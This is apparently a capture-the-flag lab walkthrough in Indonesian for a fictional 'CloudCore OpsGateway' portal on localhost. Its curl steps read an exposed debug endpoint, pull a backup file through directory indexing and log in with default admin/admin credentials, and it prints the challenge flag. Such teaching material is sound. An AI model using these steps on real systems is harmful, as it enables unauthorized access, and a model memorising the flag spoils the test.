# Panduan Praktik Terbimbing: Investigasi & Audit CloudCore OpsGateway

Dalam latihan ini, kamu akan mempraktikkan proses penemuan dan pemanfaatan kesalahan konfigurasi keamanan pada portal manajemen infrastruktur **CloudCore OpsGateway (Enterprise Cloud Management & Microservices Monitor)** yang berjalan pada `http://127.0.0.1:8012`.

---

### Langkah 1: Rekonaisans & Fingerprinting Endpoint Diagnostik
1. Buka peramban web dan akses halaman beranda sistem:
   `http://127.0.0.1:8012/`
2. Lakukan inspeksi terhadap antarmuka operasional:
   - Amati banner sistem dan tombol navigasi.
3. Ujilah endpoint variabel runtime sistem menggunakan peramban atau terminal:
   `http://127.0.0.1:8012/debug/vars`
   ```bash
   curl -s http://127.0.0.1:8012/debug/vars
   ```
4. **Analisis Temuan:**
   Server mengembalikan data lingkungan internal:
   ```json
   {
     "debug_mode": true,
     "default_credentials_enabled": true,
     "backup_storage_path": "/app/backups/",
     "routes": ["/", "/debug/vars", "/backups/", "/login", "/admin"]
   }
   ```
   Informasi ini membocorkan lokasi folder cadangan: `/backups/`!

---

### Langkah 2: Pengujian Kerentanan Directory Indexing
1. Akses jalur penyimpanan cadangan yang terungkap di endpoint diagnostik:
   `http://127.0.0.1:8012/backups/`
2. **Temuan Kritis:**
   - Server mengembalikan indeks direktori terbuka (*Directory Browsing / Autoindex Enabled*).
   - Terlihat file artefak cadangan sensitif: `backup_config.json.bak`.

> [!NOTE]
> [!NOTE]
> **Di Balik Layar: Mengapa file ini bisa terbuka?**  
> Pada web server Nginx atau Apache, opsi `autoindex on;` atau `Options +Indexes` secara otomatis membuat daftar file HTML jika tidak ada file `index.html` di direktori tersebut. Di lingkungan produksi, opsi ini wajib dimatikan (`autoindex off;`)!

---

### Langkah 3: Eksfiltrasi Arsip Cadangan & Kunci Sistem
1. Unduh file cadangan tersebut secara langsung dari browser atau gunakan terminal:
   ```bash
   curl -s http://127.0.0.1:8012/backups/backup_config.json.bak
   ```
2. **Analisis Bukti:**
   File cadangan memuat konfigurasi sensitif:
   ```json
   {
     "database_url": "sqlite:///cloudcore_prod.db",
     "default_admin_user": "admin",
     "admin_system_key": "ZITERA{53cur1ty_m15c0nf1g_b4ckup_134k}",
     "environment": "production"
   }
   ```
   Flag autoritatif ditemukan pada properti `admin_system_key`:  
   `ZITERA{53cur1ty_m15c0nf1g_b4ckup_134k}`!

---

### Langkah 4: Validasi Akses Konsol Supervisor (Default Credentials)
1. Perhatikan bahwa file konfigurasi dan endpoint diagnostik mengonfirmasi penggunaan akun bawaan pabrik:
   - **Username:** `admin`
   - **Password:** `admin`
2. Ujilah login administratif ke konsol supervisor:
   - Kunjungi `http://127.0.0.1:8012/login`.
   - Masukkan kredensial `admin` dan password `admin`.
   - Kamu berhasil masuk ke **Root Cluster Administration Console** (`/admin`).
3. Atau uji via cURL:
   ```bash
   curl -s -c cookies.txt -d "username=admin&password=admin" http://127.0.0.1:8012/login
   curl -s -b cookies.txt http://127.0.0.1:8012/admin
   ```
4. Salin flag validasi `ZITERA{53cur1ty_m15c0nf1g_b4ckup_134k}` dan kirimkan (*submit*) ke formulir tantangan Zitera Lab.
